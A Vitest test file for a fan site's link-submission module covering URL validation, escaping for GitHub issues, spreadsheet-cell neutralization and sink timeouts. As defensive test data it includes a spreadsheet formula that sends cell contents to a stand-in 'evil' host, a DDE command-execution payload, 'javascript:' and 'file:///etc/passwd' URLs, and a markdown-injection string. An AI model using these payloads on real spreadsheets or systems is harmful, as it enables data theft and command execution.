import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  validateUrl,
  domainFromUrl,
  platformGuessFromDomain,
  hashClientId,
  neutralizeCell,
  escGithubCodeSpan,
  postGitHubIssue,
  postToSheet,
  sendSubmissionEmail,
  submitLink,
  type SubmissionRecord,
} from './submit-link';

/** A fetch mock whose promise only settles when the AbortController's signal
 * fires — mirrors how real `fetch` behaves against an AbortSignal, without
 * waiting out a real network hang. Use with fake timers. */
function neverRespondingFetch() {
  return vi.fn((_url: string, init?: RequestInit) => {
    return new Promise((_resolve, reject) => {
      init?.signal?.addEventListener('abort', () => {
        reject(new DOMException('The operation was aborted.', 'AbortError'));
      });
    });
  });
}

afterEach(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
});

describe('validateUrl', () => {
  it('accepts a plain https URL', () => {
    const res = validateUrl('https://reddit.com/r/TaylorSwift');
    expect(res.ok).toBe(true);
  });

  it('accepts http', () => {
    expect(validateUrl('http://example.com').ok).toBe(true);
  });

  it('rejects non-http(s) schemes', () => {
    expect(validateUrl('javascript:alert(1)').ok).toBe(false);
    expect(validateUrl('data:text/html,hi').ok).toBe(false);
    expect(validateUrl('file:///etc/passwd').ok).toBe(false);
  });

  it('rejects empty/missing input', () => {
    expect(validateUrl('').ok).toBe(false);
    expect(validateUrl('   ').ok).toBe(false);
    expect(validateUrl(undefined).ok).toBe(false);
  });

  it('rejects malformed input', () => {
    expect(validateUrl('not a url').ok).toBe(false);
  });

  it('rejects overly long input', () => {
    const long = `https://example.com/${'a'.repeat(600)}`;
    expect(validateUrl(long).ok).toBe(false);
  });
});

describe('domainFromUrl', () => {
  it('strips a leading www. and lowercases', () => {
    expect(domainFromUrl('https://WWW.Reddit.com/r/x')).toBe('reddit.com');
  });

  it('keeps subdomains that are not www', () => {
    expect(domainFromUrl('https://old.reddit.com/r/x')).toBe('old.reddit.com');
  });
});

describe('platformGuessFromDomain', () => {
  it.each([
    ['reddit.com', 'reddit'],
    ['old.reddit.com', 'reddit'],
    ['discord.gg', 'discord'],
    ['facebook.com', 'facebook'],
    ['instagram.com', 'instagram'],
    ['tiktok.com', 'tiktok'],
    ['x.com', 'x'],
    ['twitter.com', 'x'],
    ['tumblr.com', 'tumblr'],
    ['etsy.com', 'etsy'],
    ['some-random-fansite.com', 'other'],
  ])('guesses %s → %s', (domain, expected) => {
    expect(platformGuessFromDomain(domain)).toBe(expected);
  });
});

describe('hashClientId', () => {
  it('is deterministic and never returns the raw input', () => {
    const a = hashClientId('1.2.3.4');
    const b = hashClientId('1.2.3.4');
    expect(a).toBe(b);
    expect(a).not.toContain('1.2.3.4');
  });

  it('differs for different inputs', () => {
    expect(hashClientId('1.2.3.4')).not.toBe(hashClientId('5.6.7.8'));
  });
});

describe('neutralizeCell', () => {
  it.each(['=IMPORTXML("http://evil/?"&JOIN(",",A1:A9),"//a")', '+1+1', '-1', '@SUM(A1)'])(
    'prefixes a leading formula-triggering character with a single quote: %s',
    (value) => {
      expect(neutralizeCell(value)).toBe(`'${value}`);
    },
  );

  it('leaves ordinary values untouched', () => {
    expect(neutralizeCell('https://reddit.com/r/TaylorSwift')).toBe('https://reddit.com/r/TaylorSwift');
    expect(neutralizeCell('community')).toBe('community');
    expect(neutralizeCell('')).toBe('');
  });
});

describe('escGithubCodeSpan', () => {
  it('replaces backticks so a value cannot close its enclosing code span', () => {
    const result = escGithubCodeSpan('` and now markdown **outside** the span');
    expect(result).not.toContain('`');
  });

  it('collapses newlines so a value cannot break out of its bullet line', () => {
    expect(escGithubCodeSpan('line one\nline two\r\nline three')).toBe('line one line two line three');
  });

  it('leaves ordinary values untouched', () => {
    expect(escGithubCodeSpan('reddit.com')).toBe('reddit.com');
  });
});

const baseRecord: SubmissionRecord = {
  url: 'https://reddit.com/r/TaylorSwift',
  domain: 'reddit.com',
  platformGuess: 'reddit',
  section: 'community',
  submittedAt: '2026-08-14T00:00:00.000Z',
  clientHash: 'abc123',
};

describe('postGitHubIssue', () => {
  it('is not attempted without GITHUB_FEEDBACK_TOKEN', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await postGitHubIssue(baseRecord);
    expect(res).toEqual({ attempted: false, ok: false });
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('files a distinctly-labeled issue when a token is set', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    const fetchSpy = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ number: 7, html_url: 'http://gh/7' }), { status: 201 }),
    );
    vi.stubGlobal('fetch', fetchSpy);

    const res = await postGitHubIssue(baseRecord);
    expect(res).toEqual({ attempted: true, ok: true, number: 7, url: 'http://gh/7' });

    const [, init] = fetchSpy.mock.calls[0];
    const sent = JSON.parse(init.body as string);
    expect(sent.labels).toEqual(['link-submission']);
    expect(sent.body).toContain('reddit.com');
  });

  it('reports failure without throwing on a non-ok GitHub response', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response('bad', { status: 500 })));
    const res = await postGitHubIssue(baseRecord);
    expect(res).toEqual({ attempted: true, ok: false });
  });

  it('escapes a backtick in a record field instead of letting it break out of its code span', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    const fetchSpy = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ number: 8, html_url: 'http://gh/8' }), { status: 201 }),
    );
    vi.stubGlobal('fetch', fetchSpy);

    const malicious: SubmissionRecord = {
      ...baseRecord,
      sourcePage: '` **injected markdown** `',
    };
    await postGitHubIssue(malicious);

    const [, init] = fetchSpy.mock.calls[0];
    const sent = JSON.parse(init.body as string);
    // The body still contains exactly two literal backticks per field line
    // (the wrapping pair) — none of the injected backticks survived.
    const fromPageLine = sent.body.split('\n').find((l: string) => l.includes('From page'));
    expect((fromPageLine.match(/`/g) || []).length).toBe(2);
  });

  it('does not hang the caller when the GitHub fetch never resolves', async () => {
    vi.useFakeTimers();
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal('fetch', neverRespondingFetch());

    const promise = postGitHubIssue(baseRecord);
    await vi.advanceTimersByTimeAsync(5100);
    const res = await promise;

    expect(res).toEqual({ attempted: true, ok: false });
    vi.useRealTimers();
  });
});

describe('postToSheet', () => {
  it('is not attempted without SUBMISSIONS_SHEET_WEBHOOK_URL', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await postToSheet(baseRecord);
    expect(res).toEqual({ attempted: false, ok: false });
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('posts the row when the webhook URL is set', async () => {
    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
    const fetchSpy = vi.fn().mockResolvedValue(new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);
    const res = await postToSheet(baseRecord);
    expect(res).toEqual({ attempted: true, ok: true });
    expect(fetchSpy).toHaveBeenCalledWith('https://script.google.com/hook', expect.any(Object));
  });

  it('reports failure without throwing when the webhook errors', async () => {
    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('timeout')));
    const res = await postToSheet(baseRecord);
    expect(res).toEqual({ attempted: true, ok: false });
  });

  it('neutralizes every outgoing cell that could be interpreted as a formula', async () => {
    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
    const fetchSpy = vi.fn().mockResolvedValue(new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);

    // A record whose fields carry formula-triggering leading characters —
    // simulates whichever field a future change makes user-writable, per
    // the finding's "regardless of which field" requirement.
    const malicious: SubmissionRecord = {
      ...baseRecord,
      domain: '=IMPORTXML("http://evil/?"&JOIN(",",A1:A9),"//a")',
      sourcePage: '+cmd|"/c calc"!A1',
    };
    await postToSheet(malicious);

    const [, init] = fetchSpy.mock.calls[0];
    const sent = JSON.parse(init.body as string);
    expect(sent.domain).toBe(`'${malicious.domain}`);
    expect(sent.source_page).toBe(`'${malicious.sourcePage}`);
    // Ordinary fields are untouched.
    expect(sent.url).toBe(baseRecord.url);
    expect(sent.section).toBe(baseRecord.section);
  });

  it('does not hang the caller when the sheet webhook never resolves', async () => {
    vi.useFakeTimers();
    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
    vi.stubGlobal('fetch', neverRespondingFetch());

    const promise = postToSheet(baseRecord);
    await vi.advanceTimersByTimeAsync(5100);
    const res = await promise;

    expect(res).toEqual({ attempted: true, ok: false });
    vi.useRealTimers();
  });
});

describe('sendSubmissionEmail', () => {
  it('is not attempted without RESEND_API_KEY + SUBMISSIONS_EMAIL_FROM', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await sendSubmissionEmail(baseRecord);
    expect(res).toEqual({ attempted: false, ok: false });
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('is not attempted when only one of the two env vars is set', async () => {
    vi.stubEnv('RESEND_API_KEY', 'key');
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await sendSubmissionEmail(baseRecord);
    expect(res).toEqual({ attempted: false, ok: false });
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('sends via a plain fetch to Resend when both are set', async () => {
    vi.stubEnv('RESEND_API_KEY', 'key');
    vi.stubEnv('SUBMISSIONS_EMAIL_FROM', 'submissions@longlivets.com');
    const fetchSpy = vi.fn().mockResolvedValue(new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);
    const res = await sendSubmissionEmail(baseRecord);
    expect(res).toEqual({ attempted: true, ok: true });
    const [url, init] = fetchSpy.mock.calls[0];
    expect(url).toBe('https://api.resend.com/emails');
    const sent = JSON.parse(init.body as string);
    expect(sent.to).toEqual(['sffan15@gmail.com']);
  });

  it('does not hang the caller when the Resend fetch never resolves', async () => {
    vi.useFakeTimers();
    vi.stubEnv('RESEND_API_KEY', 'key');
    vi.stubEnv('SUBMISSIONS_EMAIL_FROM', 'submissions@longlivets.com');
    vi.stubGlobal('fetch', neverRespondingFetch());

    const promise = sendSubmissionEmail(baseRecord);
    await vi.advanceTimersByTimeAsync(5100);
    const res = await promise;

    expect(res).toEqual({ attempted: true, ok: false });
    vi.useRealTimers();
  });
});

describe('submitLink', () => {
  it('never throws, even when every sink is unconfigured', async () => {
    vi.stubGlobal('fetch', vi.fn());
    const outcome = await submitLink(baseRecord);
    expect(outcome.githubIssue.attempted).toBe(false);
    expect(outcome.sheet.attempted).toBe(false);
    expect(outcome.email.attempted).toBe(false);
  });

  it('still resolves within the timeout even when the always-on GitHub sink hangs', async () => {
    vi.useFakeTimers();
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal('fetch', neverRespondingFetch());

    const promise = submitLink(baseRecord);
    await vi.advanceTimersByTimeAsync(5100);
    const outcome = await promise;

    expect(outcome.githubIssue).toEqual({ attempted: true, ok: false });
    vi.useRealTimers();
  });
});
